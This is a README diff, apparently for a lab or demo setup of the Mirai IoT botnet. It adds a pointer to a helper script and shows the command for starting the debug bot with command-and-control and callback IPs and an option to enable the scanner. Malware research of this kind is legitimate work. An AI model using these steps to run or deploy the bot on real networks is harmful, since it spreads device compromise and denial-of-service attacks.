@@ -53,6 +53,7 @@ We'll need to update the `sources.list` to get `apt-get` working (only applies t
 ###Instructions for Running bot (assumes you have already built it)
 1. run the bot: `sudo ./debug/mirai.dbg <cnc ip> <local ip> <callback ip> <enable scanner 0/1>` (assumes you have built the debug version)
   * e.g. `sudo ./debug/mirai.dbg 10.0.0.1 10.0.0.2 10.0.0.1 0`
+  * you can use [mirai/demo-bot.sh](mirai/demo-bot.sh) that automatically finds the ip address of eth0 (be sure to change the hardcoded cnc and callback ip addresses)
 
 ###Installation Instructions for Building
 1. install golang
